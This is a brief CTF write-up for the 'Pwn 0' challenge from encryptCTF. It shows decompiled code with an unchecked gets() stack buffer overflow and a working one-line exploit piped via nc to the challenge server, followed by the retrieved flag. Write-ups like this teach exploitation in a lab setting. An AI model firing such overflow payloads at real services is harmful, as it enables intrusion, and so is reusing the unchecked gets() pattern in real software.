## Pwn 0
### Pwning / Binary Exploitaion

A pretty basic challenge in binary exploitation. We are given a binary. Let's fire it up in Ghidra

The main function 
```

undefined4 main(void)

{
  int iVar1;
  char local_54 [64];
  undefined local_14 [16];
  
  setvbuf(stdout,(char *)0x0,2,0);
  puts("How\'s the josh?");
  gets(local_54);
  iVar1 = memcmp(local_14,&DAT_0804862d,4);
  if (iVar1 == 0) {
    puts("Good! here\'s the flag");
    print_flag();
  }
  else {
    puts("Your josh is low!\nBye!");
  }
  return 0;
}
```
Our input is being fed into `local_54` whereas, the value is compared i `local_14`. Since `gets` is being used, we exploit  `buffer overflow`

The value at `DAT_0804862d` is `H!gh`

Final Exploit
```
python -c 'print("A"*64+"H!gh\n")' | nc 104.154.106.182 1234
How's the josh?
Good! here's the flag
encryptCTF{L3t5_R4!53_7h3_J05H}
 ```